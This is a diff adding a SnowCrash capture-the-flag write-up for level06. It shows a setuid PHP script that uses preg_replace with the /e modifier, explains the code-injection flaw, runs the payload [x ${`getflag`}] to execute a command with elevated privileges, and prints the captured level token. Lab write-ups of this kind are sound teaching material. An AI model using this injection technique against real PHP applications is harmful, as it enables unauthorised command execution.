@@ -1,0 +1,35 @@
+# in this level we have two files level06 and level06.php
+level06@SnowCrash:~$ ls -l
+total 12
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+
+# both of them are setuid, and the owner is flag06 and they run same code
+# let's read the script
+
+level06@SnowCrash:~$ cat level06.php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+# in this line: 'preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);', there's a vulnerability we can exploit to run "/bin/getflag" with flag06 privileges
+# the preg_replace replaces matches of the regex /(\[x (.*)\])/ by y("\2"), since we have /e, "y("\2")" gets executed as string PHP code
+# let's have a file with the content: [x ${`getflag`}], and feed it as input to the script
+# thanks to \e we will be able to run y("${`getflag`}") as PHP string code
+# since we're executing PHP string code and $ is encountered inside double quotes, then PHP's interpolation is triggered, after this the expression inside is enclosed
+# in backticks, which means it's a command that needs to execute, after executing the command (getflag with flag06's privileges) the variable is now:
+# $COMMAND_OUTPUT, and since this variable doesn't exist, PHP error modules will complain and write to stderr in the console 'undefined variable: COMMAND_OUTPUT'
+# all we care about is COMMAND_OUTPUT which has the flag
+
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/level06_flag
+level06@SnowCrash:~$ ./level06 /tmp/level06_flag
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+level06@SnowCrash:~$ su level07
+Password: 
+level07@SnowCrash:~$ 
+
